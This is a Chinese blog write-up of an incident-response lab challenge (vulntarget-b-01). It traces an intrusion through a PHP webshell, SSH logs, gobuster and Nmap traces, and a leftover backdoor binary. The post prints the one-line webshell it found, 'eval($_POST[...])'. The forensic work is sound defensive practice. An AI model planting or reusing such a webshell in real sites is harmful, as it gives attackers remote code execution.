---
layout: post
title: 玄机——vulntarget-b-01
---

上来我们先定位web服务的根目录位置，通过检索得知是在`/www/wwwroot`下。然后使用`find`+`grep`快速定位恶意文件位置

```bash
find /www -name '*.php' | xargs grep 'eval('
/www/wwwroot/jizhi/index.php:eval($_POST["Admin@@"]);
```

再查看SSH日志，发现除去我们的登录信息，还有两个可疑IP的`Accepted`信息。其中`192.168.83.1`就是成功登陆后台的恶意IP

```bash
[root@ip-10-0-10-3 log]# cat /var/log/secure
Dec 11 16:12:48 MiWiFi-RA80-srv sshd[2600]: Accepted password for root from 192.168.31.190 port 62631 ssh2
Nov 20 11:27:57 localhost sshd[2670]: Accepted password for root from 192.168.83.1 port 28363 ssh2
```

翻阅网站工作目录下的`127.0.0.1.log`文件，我们可以发现`192.168.83.1`对login路由的大量访问。合理怀疑其是在对admin密码进行爆破。观察到其访问端口为81，故入口点端口为81.且记录开头有大量的`gobuster`标识，所以我们也得知了攻击者的扫描工具及其版本号为`gobuster/3.6`

接下来审计`access.log`文件。发现其内部有大量的`Nmap`记录，怀疑对方使用`Nmap`进行的端口扫描，故黑客是通的探测ssh服务的工具为Nmap

最后我们需要查找留存的后门文件，根据渗透经验一般可知`Linux`后门文件一般为`.sh`或者`.elf`可执行文件。通过`find`指令匹配后缀可以很轻松的搜到`index.elf`。但此题目我的环境有点问题，宝塔自动杀掉了后门，我的`index.elf`是在垃圾箱内找到的，正常环境此文件于`tmp`目录下。